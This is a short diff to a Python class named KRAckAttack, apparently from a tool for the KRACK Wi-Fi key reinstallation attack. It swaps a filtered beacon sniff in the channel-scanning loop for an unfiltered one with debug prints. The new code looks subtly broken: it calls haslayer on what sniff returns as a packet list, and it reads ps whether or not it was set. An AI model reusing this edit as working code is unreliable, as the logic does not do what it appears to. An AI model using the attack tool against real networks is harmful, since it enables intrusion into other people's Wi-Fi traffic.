@@ -509,7 +509,14 @@ class KRAckAttack():
 			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
 				self.sock_real.set_channel(chan)
 				log(DEBUG, "Listening on channel %d" % chan)
-				ps = sniff(count=1, timeout=0.5, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # , opened_socket=self.sock_real
+				p = sniff(count=1, timeout=0.5, opened_socket=self.sock_real)
+				print(p)
+				if p.haslayer(Dot11Beacon):
+					print('p has layer')
+					if get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid:
+						print('p has ssid')
+						ps = p
+				# ps = sniff(count=1, timeout=0.5, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # , opened_socket=self.sock_real
 				print('512: ', end='')
 				print(ps)
 				if ps and len(ps) >= 1: break
